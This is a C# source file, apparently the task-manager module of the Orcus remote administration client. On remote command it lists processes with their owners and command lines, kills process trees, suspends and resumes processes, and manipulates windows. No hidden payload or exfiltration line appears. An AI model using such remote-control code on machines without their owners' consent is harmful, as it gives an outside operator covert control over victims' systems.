using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.Reflection;
using System.Security.Principal;
using System.Text;
using Orcus.Native;
using Orcus.Plugins;
using Orcus.Shared.Commands.TaskManager;
using Orcus.Shared.NetSerializer;
using Orcus.Utilities;

namespace Orcus.Commands.TaskManager
{
    internal class TaskmanagerCommand : Command
    {
        // ReSharper disable once InconsistentNaming
        private const UInt32 WM_CLOSE = 0x0010;

        public List<int> SendProcesses { get; set; }

        public override void ProcessCommand(byte[] parameter, IConnectionInfo connectionInfo)
        {
            Serializer serializer;
            IntPtr handle;
            switch ((TaskManagerCommunication) parameter[0])
            {
                case TaskManagerCommunication.SendKill:
                    var id = BitConverter.ToInt32(parameter, 1);
                    Process processToKill;
                    try
                    {
                        processToKill = Process.GetProcessById(id);
                    }
                    catch (ArgumentException)
                    {
                        var errorPackage = new List<byte> {(byte) TaskManagerCommunication.ResponseTaskKillFailed};
                        errorPackage.AddRange(Encoding.UTF8.GetBytes("The process does not exist"));
                        connectionInfo.CommandResponse(this, errorPackage.ToArray());
                        return;
                    }

                    try
                    {
                        processToKill.Kill();
                    }
                    catch (Exception ex)
                    {
                        var errorPackage = new List<byte> {(byte) TaskManagerCommunication.ResponseTaskKillFailed};
                        errorPackage.AddRange(Encoding.UTF8.GetBytes(ex.Message));
                        connectionInfo.CommandResponse(this, errorPackage.ToArray());
                        return;
                    }

                    connectionInfo.CommandResponse(this,
                        new[] {(byte) TaskManagerCommunication.ResponseTaskKilled});
                    break;
                case TaskManagerCommunication.SendGetFullList:
                    serializer = new Serializer(typeof (List<ProcessInfo>));
                    var result = new List<byte> {(byte) TaskManagerCommunication.ResponseFullList};
                    var processes = GetAllProcesses();
                    result.AddRange(serializer.Serialize(GetAllProcesses()));
                    connectionInfo.CommandResponse(this, result.ToArray());
                    SendProcesses = processes.Select(x => x.Id).ToList();
                    break;
                case TaskManagerCommunication.SendGetChanges:
                    var allProcesses = Process.GetProcesses();
                    var newProcesses = allProcesses.ToList();
                    foreach (var process in allProcesses.Where(process => SendProcesses.Any(x => x == process.Id)))
                        newProcesses.Remove(process);

                    var closedProcesses =
                        SendProcesses.Where(process => allProcesses.All(x => x.Id != process)).ToList();
                    var changelog = new ProcessListChangelog
                    {
                        ClosedProcesses = closedProcesses,
                        NewProcesses = new List<ProcessInfo>()
                    };

                    using (var searcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Process"))
                    using (var collection = searcher.Get())
                    {
                        foreach (var queryObj in collection.Cast<ManagementObject>())
                        {
                            var pid = queryObj.TryGetProperty<uint>("ProcessId");
                            var process = newProcesses.FirstOrDefault(x => x.Id == pid);
                            if (process == null)
                                continue;

                            changelog.NewProcesses.Add(ManagementObjectToProcessInfo(queryObj, process));
                        }
                    }

                    serializer = new Serializer(typeof (ProcessListChangelog));
                    var changelogResult = new List<byte> {(byte) TaskManagerCommunication.ResponseChanges};
                    changelogResult.AddRange(serializer.Serialize(changelog));
                    connectionInfo.CommandResponse(this, changelogResult.ToArray());
                    SendProcesses = allProcesses.Select(x => x.Id).ToList();
                    break;
                case TaskManagerCommunication.SetPriority:
                    var processId = BitConverter.ToInt32(parameter, 1);
                    Process processToChange;
                    try
                    {
                        processToChange = Process.GetProcessById(processId);
                    }
                    catch (ArgumentException)
                    {
                        var errorPackage = new List<byte> {(byte) TaskManagerCommunication.ResponseSetPriorityFailed};
                        errorPackage.AddRange(Encoding.UTF8.GetBytes("The process does not exist"));
                        connectionInfo.CommandResponse(this, errorPackage.ToArray());
                        return;
                    }

                    try
                    {
                        processToChange.PriorityClass = (ProcessPriorityClass) BitConverter.ToInt32(parameter, 5);
                    }
                    catch (Exception ex)
                    {
                        var errorPackage = new List<byte> {(byte) TaskManagerCommunication.ResponseSetPriorityFailed};
                        errorPackage.AddRange(Encoding.UTF8.GetBytes(ex.Message));
                        connectionInfo.CommandResponse(this, errorPackage.ToArray());
                        return;
                    }

                    connectionInfo.CommandResponse(this,
                        new[] {(byte) TaskManagerCommunication.ResponsePrioritySet});
                    break;
                case TaskManagerCommunication.KillProcessTree:
                    processId = BitConverter.ToInt32(parameter, 1);
                    KillProcessAndChildren(processId);
                    ResponseByte((byte) TaskManagerCommunication.ResponseProcessTreeKilled, connectionInfo);
                    break;
                case TaskManagerCommunication.SuspendProcess:
                    var processToSuspend = Process.GetProcessById(BitConverter.ToInt32(parameter, 1));
                    processToSuspend.Suspend();
                    ResponseByte((byte) TaskManagerCommunication.ResponseProcessSuspended, connectionInfo);
                    break;
                case TaskManagerCommunication.ResumeProcess:
                    var processToResume = Process.GetProcessById(BitConverter.ToInt32(parameter, 1));
                    processToResume.Resume();
                    ResponseByte((byte) TaskManagerCommunication.ResponseProcessResumed, connectionInfo);
                    break;
                case TaskManagerCommunication.WindowBringToFront:
                    handle = (IntPtr) BitConverter.ToInt64(parameter, 1);
                    if (NativeMethods.IsIconic(handle))
                        NativeMethods.ShowWindow(handle, ShowWindowCommands.Restore);
                    var success = NativeMethods.SetForegroundWindow(handle);
                    ResponseByte(
                        (byte)
                            (success
                                ? TaskManagerCommunication.ResponseWindowActionDone
                                : TaskManagerCommunication.ResponseWindowActionFailed), connectionInfo);
                    break;
                case TaskManagerCommunication.WindowMaximize:
                    handle = (IntPtr)BitConverter.ToInt64(parameter, 1);
                    success = NativeMethods.ShowWindow(handle, ShowWindowCommands.Maximize);
                    ResponseByte(
                        (byte)
                            (success
                                ? TaskManagerCommunication.ResponseWindowActionDone
                                : TaskManagerCommunication.ResponseWindowActionFailed), connectionInfo);
                    break;
                case TaskManagerCommunication.WindowMinimize:
                    handle = (IntPtr)BitConverter.ToInt64(parameter, 1);
                    success = NativeMethods.ShowWindow(handle, ShowWindowCommands.Minimize);
                    ResponseByte(
                        (byte)
                            (success
                                ? TaskManagerCommunication.ResponseWindowActionDone
                                : TaskManagerCommunication.ResponseWindowActionFailed), connectionInfo);
                    break;
                case TaskManagerCommunication.WindowRestore:
                    handle = (IntPtr)BitConverter.ToInt64(parameter, 1);
                    success = NativeMethods.ShowWindow(handle, ShowWindowCommands.Restore);
                    ResponseByte(
                        (byte)
                            (success
                                ? TaskManagerCommunication.ResponseWindowActionDone
                                : TaskManagerCommunication.ResponseWindowActionFailed), connectionInfo);
                    break;
                case TaskManagerCommunication.WindowClose:
                    handle = (IntPtr) BitConverter.ToInt64(parameter, 1);
                    success = NativeMethods.SendMessage(handle, WM_CLOSE, IntPtr.Zero, IntPtr.Zero) == IntPtr.Zero;
                    ResponseByte(
                        (byte)
                            (success
                                ? TaskManagerCommunication.ResponseWindowActionDone
                                : TaskManagerCommunication.ResponseWindowActionFailed), connectionInfo);
                    break;
                default:
                    throw new ArgumentOutOfRangeException();
            }
        }

        private static List<ProcessInfo> GetAllProcesses()
        {
            var result = new List<ProcessInfo>();
            var processes = Process.GetProcesses();
            using (var searcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Process"))
            using (var collection = searcher.Get())
            using (var serviceSearcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT ProcessId FROM Win32_Service"))
            using (var serviceCollection = serviceSearcher.Get())
            {
                var serviceProcessIds =
                    serviceCollection.Cast<ManagementObject>().Select(x => (uint) x["ProcessId"]).ToList();
                foreach (var queryObj in collection.Cast<ManagementObject>())
                {
                    var pid = queryObj.TryGetProperty<uint>("ProcessId");
                    var process = ManagementObjectToProcessInfo(queryObj, processes.FirstOrDefault(x => x.Id == pid));
                    if (process.Status != ProcessStatus.Immersive && serviceProcessIds.Contains(pid)) //because Immersive > Service
                        process.Status = ProcessStatus.Service;
                    result.Add(process);
                }
            }

            return result;
        }

        private static void ApplyProcessInformation(Process process, ProcessInfo processInfo, string filename)
        {
            IntPtr handle;
            try
            {
                handle = process.Handle;
            }
            catch (Exception)
            {
                processInfo.CanChangePriorityClass = false;
                return;
            }

            try
            {
                processInfo.PriorityClass = process.PriorityClass;
                processInfo.CanChangePriorityClass = true;
            }
            catch (Exception)
            {
                // ignored
                processInfo.CanChangePriorityClass = false;
            }

            try
            {
                var sid = ProcessExtension.GetProcessOwner(handle);
                processInfo.ProcessOwner = new SecurityIdentifier(sid).Translate(typeof(NTAccount)).ToString();
                if (string.Equals(User.UserIdentity?.User?.Value, sid, StringComparison.OrdinalIgnoreCase))
                    processInfo.Status = ProcessStatus.UserProcess;
            }
            catch (Exception)
            {
                // ignored
            }

            try
            {
                var fileVersionInfo = FileVersionInfo.GetVersionInfo(filename);
                processInfo.Description = fileVersionInfo.FileDescription;
                processInfo.CompanyName = fileVersionInfo.CompanyName;
                processInfo.ProductVersion = fileVersionInfo.ProductVersion;
                processInfo.FileVersion = fileVersionInfo.FileVersion;
                processInfo.IconBytes = FileUtilities.GetIconFromProcess(fileVersionInfo.FileName);

                AssemblyName.GetAssemblyName(filename);
                processInfo.Status = ProcessStatus.NetAssembly;
            }
            catch (Exception)
            {
                // ignored
            }

            //IsImmersiveProcess is only available at win8+
            var win8Version = new Version(6, 2, 9200, 0);
            if (Environment.OSVersion.Platform == PlatformID.Win32NT &&
                Environment.OSVersion.Version >= win8Version && NativeMethods.IsImmersiveProcess(handle))
            {
                processInfo.Status = ProcessStatus.Immersive;
            }
        }

        //https://msdn.microsoft.com/en-us/library/windows/desktop/aa394372%28v=vs.85%29.aspx
        private static ProcessInfo ManagementObjectToProcessInfo(ManagementObject queryObj, Process process)
        {
            var result = new ProcessInfo
            {
                Name =  queryObj.TryGetProperty<string>("Name"),
                PrivateBytes = process?.PrivateMemorySize64 ?? 0,
                WorkingSet = (long) queryObj.TryGetProperty<ulong>("WorkingSetSize"),
                Id = (int) queryObj.TryGetProperty<uint>("ProcessId"),
                ParentProcess = (int) queryObj.TryGetProperty<uint>("ParentProcessId"),
                StartTime =
                    (ManagementExtensions.ToDateTimeSafe(queryObj.TryGetProperty<string>("CreationDate")) ??
                     ExceptionUtilities.EatExceptions(() => process?.StartTime) ?? DateTime.MinValue)
                        .ToUniversalTime(),
                Filename = queryObj.TryGetProperty<string>("ExecutablePath"),
                CommandLine =  queryObj.TryGetProperty<string>("CommandLine"),
                MainWindowHandle = (long) (process?.MainWindowHandle ?? IntPtr.Zero)
            };

            ApplyProcessInformation(process, result, queryObj.TryGetProperty<string>("ExecutablePath"));

            return result;
        }

        //Source: https://stackoverflow.com/questions/5901679/kill-process-tree-programatically-in-c-sharp
        /// <summary>
        ///     Kill a process, and all of its children, grandchildren, etc.
        /// </summary>
        /// <param name="pid">Process ID.</param>
        private static void KillProcessAndChildren(int pid)
        {
            using (
                var searcher =
                    new ManagementObjectSearcher("Select * From Win32_Process Where ParentProcessID=" + pid))
            using (var moc = searcher.Get())
            {
                foreach (var o in moc)
                {
                    var mo = (ManagementObject) o;
                    KillProcessAndChildren((int) mo.TryGetProperty<uint>("ProcessID"));
                }
                try
                {
                    var proc = Process.GetProcessById(pid);
                    proc.Kill();
                }
                catch (Exception)
                {
                    // Process already exited.
                }
            }
        }

        protected override uint GetId()
        {
            return 16;
        }
    }
}